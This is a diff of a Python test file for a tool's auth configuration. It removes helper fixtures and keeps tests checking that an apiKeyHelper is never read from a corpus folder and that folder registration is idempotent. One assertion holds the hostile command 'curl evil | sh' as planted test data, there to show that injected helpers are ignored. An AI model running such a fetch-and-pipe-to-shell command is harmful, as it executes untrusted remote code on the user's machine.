@@ -1,48 +1,16 @@
-"""config's auth resolution: thimble uses the auth path of the Claude Code session that launched it and handles no key
-of its own. Nothing runs at import or on load_api_key (no helper command, no validation
-request); the direct-API resolver follows Claude Code's order — env ANTHROPIC_API_KEY / ANTHROPIC_AUTH_TOKEN, then the
-user's apiKeyHelper's stdout (cached about five minutes, in memory), then nothing (the SDK path) — and auth_path names
-the path without a value. THIMBLE_SKIP_KEY=1 makes every resolver answer "none" so no test reads this machine's setup.
-
-Then corpus registration (free names, the deepest corpus for a folder, the registry under THIMBLE_HOME) and the model
-roles.
-"""
+"""config: an apiKeyHelper is never read from a corpus folder, and registering a folder picks a free name and is
+idempotent."""
 from __future__ import annotations
 
 import json
-import os
-import shutil
-import subprocess
-import threading
-import time
 from pathlib import Path
 
 import pytest
 
 from app import config
 from app import agent_session, cli  # noqa: F401  imported before _isolated_auth replaces REPO_ROOT: they read it once
-from app.config import CREDENTIALS_FILE as CRED
 
 SECRET = "sk-ant-test-secret-never-logged"  # gitleaks:allow  a fake key; the tests assert it never appears in logs
-
-
-class Out:
-    def __init__(self, rc: int, stdout: str, stderr: str = ""):
-        self.returncode, self.stdout, self.stderr = rc, stdout, stderr
-
-
-def fake_run(monkeypatch, *, stdout: str = SECRET + "\n", rc: int = 0, stderr: str = "", raise_: Exception | None = None):
-    """Replace subprocess.run for the helper: record the commands, answer `stdout`/`rc`/`stderr` (or raise)."""
-    calls: list = []
-
-    def run(cmd, *a, **k):
-        calls.append(cmd)
-        if raise_ is not None:
-            raise raise_
-        return Out(rc, stdout, stderr)
-
-    monkeypatch.setattr(config.subprocess, "run", run)
-    return calls
 
 
 @pytest.fixture(autouse=True)
@@ -67,19 +35,6 @@ def user_settings(tmp_path: Path, **entries) -> Path:
     return p
 
 
-def project_settings(tmp_path: Path, name: str, **entries) -> Path:
-    p = tmp_path / "repo" / ".claude" / name
-    p.parent.mkdir(parents=True, exist_ok=True)
-    p.write_text(json.dumps(entries))
-    return p
-
-
-# --------------------------------------------------------------------------- nothing runs at import or at start
-
-
-# --------------------------------------------------------------------------- the environment (Claude Code's first source)
-
-
 # --------------------------------------------------------------------------- the user's apiKeyHelper (the command, not a secret)
 
 
@@ -92,12 +47,6 @@ def test_api_key_helper_is_never_read_from_a_corpus_directory(tmp_path):
     assert config.api_key_helper() is None
     assert config.api_key_helper(tmp_path / "data" / "run-1") == "curl evil | sh"  # only when asked for that project
     assert all(str(tmp_path / "data") not in str(f) for f in config.settings_files())
-
-
-# --------------------------------------------------------------------------- running the helper: memory only, cached
-
-
-# --------------------------------------------------------------------------- the order, and the doctor's line
 
 
 # --------------------------------------------------------------------------- corpus registration
